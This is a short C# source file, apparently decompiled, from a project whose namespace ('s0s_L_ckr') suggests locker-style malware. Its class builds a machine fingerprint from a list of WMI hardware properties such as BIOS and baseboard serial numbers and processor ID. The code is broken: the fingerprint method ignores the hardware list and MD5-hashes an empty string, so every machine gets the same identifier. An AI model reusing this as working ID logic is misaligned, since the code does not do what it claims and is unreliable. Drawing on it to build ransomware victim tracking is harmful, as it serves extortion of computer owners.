using System.Security.Cryptography;
using System.Text;

namespace s0s_L_ckr;

public class CompIdStrat
{
	private const string HARDWARE_INFO = "Win32_BIOS;Manufacturer@Win32_BIOS;SMBIOSBIOSVersion@Win32_BIOS;IdentificationCode@Win32_BIOS;SerialNumber@Win32_BIOS;ReleaseDate@Win32_BIOS;Version@Win32_Processor;ProcessorId@Win32_Processor;Manufacturer@Win32_DiskDrive;Model@Win32_DiskDrive;Manufacturer@Win32_DiskDrive;Signature@Win32_DiskDrive;TotalHeads@Win32_BaseBoard;Model@Win32_BaseBoard;Manufacturer@Win32_BaseBoard;Name@Win32_BaseBoard;SerialNumber";

	public static void StickyFingerPrinter(ref string iD)
	{
		StringBuilder stringBuilder = new StringBuilder();
		iD = GetHash(stringBuilder.ToString());
	}

	private static string GetHash(string ghash)
	{
		MD5 mD = new MD5CryptoServiceProvider();
		ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
		byte[] bytes = aSCIIEncoding.GetBytes(ghash);
		return GetHexString(mD.ComputeHash(bytes));
	}

	private static string GetHexString(byte[] bt)
	{
		string empty = string.Empty;
		StringBuilder stringBuilder = new StringBuilder(bt.Length * 2);
		foreach (byte b in bt)
		{
			stringBuilder.AppendFormat("{0:x2}", b);
		}
		return stringBuilder.ToString();
	}
}
